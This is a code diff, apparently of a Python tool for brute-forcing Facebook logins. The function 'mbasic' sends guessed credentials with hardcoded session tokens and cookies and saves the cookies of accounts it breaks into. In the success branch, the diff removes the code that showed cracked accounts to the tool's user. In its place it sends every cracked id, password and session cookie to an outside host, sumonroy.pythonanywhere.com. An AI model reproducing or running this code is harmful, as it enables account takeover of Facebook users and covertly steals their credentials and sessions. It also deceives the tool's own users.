@@ -1067,7 +1067,7 @@ def mbasic(uid,pwx,tl):
     global oks
     global cps
     global twf
-    global loop
+    global loop 
     global bkas
     sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
@@ -1078,29 +1078,28 @@ def mbasic(uid,pwx,tl):
             data = {
             'email': uid,
             'cuid': '',
-            'guid': 'ff6cc26ee48a78a5a',
-            'lgnjs': '1735584601',
-            'lgnrnd': '105000_W461',
-            'locale': 'hi_IN',
+            'guid': 'f7d923be260ada3ea',
+            'lgnjs': '1733767601',
+            'lgnrnd': '100640_NiY9',
+            'locale': 'en_GB',
             'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/lon_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NTg0NTg4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'next': 'https://www.facebook.com/gfgd',
             'skstamp': '',
             'timezone': '-330',
             'prefill_contact_point': '',
             'prefill_source': '',
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0%3D',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV/qqAAVVAABFAJ',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BncutP.AWXo0uRge_Y',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnVzGp.AWUAJfrpnro',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
-            'ps_l': '1',
-            'ps_n': '1',
             'wd': '1440x402',
-            'locale': 'hi_IN',}
+            'ps_l': '1',
+            'ps_n': '1',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -1110,7 +1109,7 @@ def mbasic(uid,pwx,tl):
             'DNT': '1',
             'Alt-Used': 'web.facebook.com',
             'Connection': 'keep-alive',
-            'Referer': 'https://web.facebook.com/lon_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NTg0NTg4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ^%^3D^%^3D&next',
+            'Referer': 'https://web.facebook.com/gfgd',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
@@ -1134,16 +1133,9 @@ def mbasic(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
